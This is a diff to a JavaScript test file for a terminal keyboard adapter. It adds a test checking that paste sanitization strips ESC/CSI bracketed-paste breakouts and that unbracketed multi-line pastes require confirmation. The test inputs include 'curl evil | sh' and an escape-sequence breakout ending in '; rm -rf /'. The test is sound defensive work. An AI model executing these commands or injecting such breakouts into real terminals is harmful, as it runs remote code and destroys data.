@@ -9,7 +9,12 @@ const here = dirname(fileURLToPath(import.meta.url));
 execSync("npx esbuild src/keys.ts --bundle --format=esm --outfile=test/.keys.build.mjs", {
   cwd: join(here, ".."),
 });
-const { browserShortcut, KeyboardAdapter } = await import("./.keys.build.mjs");
+const {
+  browserShortcut,
+  KeyboardAdapter,
+  sanitizePasteText,
+  pasteRequiresConfirmation,
+} = await import("./.keys.build.mjs");
 const key = (over = {}) => ({
   type: "keydown", key: "Enter", code: "Enter", shiftKey: false, ctrlKey: false, altKey: false, metaKey: false,
   ...over,
@@ -282,4 +287,17 @@ test("kitty keyboard protocol setKittyFlags modes, stack depth cap, resetKittyFl
   for (let i = 1; i <= 20; i++) adapter.pushKittyFlags(i & 31);
   adapter.popKittyFlags(16);
   assert.equal(adapter.encode(key({ key: "Escape", code: "Escape" }), "linux"), null);
+});
+
+test("sanitizePasteText strips nested ESC/CSI breakouts and pasteRequiresConfirmation guards unbracketed CR/LF", () => {
+  assert.equal(pasteRequiresConfirmation("curl evil | sh\n", false), true);
+  assert.equal(pasteRequiresConfirmation("curl evil | sh\r", false), true);
+  assert.equal(pasteRequiresConfirmation("plain single line", false), false);
+  assert.equal(pasteRequiresConfirmation("line1\nline2", true), false);
+
+  const malicious = "safe\x1b[20\x1b[201~1~\x9b201~; rm -rf /\n";
+  const cleaned = sanitizePasteText(malicious);
+  assert.equal(cleaned.includes("\x1b"), false);
+  assert.equal(cleaned.includes("\x9b"), false);
+  assert.equal(cleaned, "safe[20[201~1~201~; rm -rf /\n");
 });
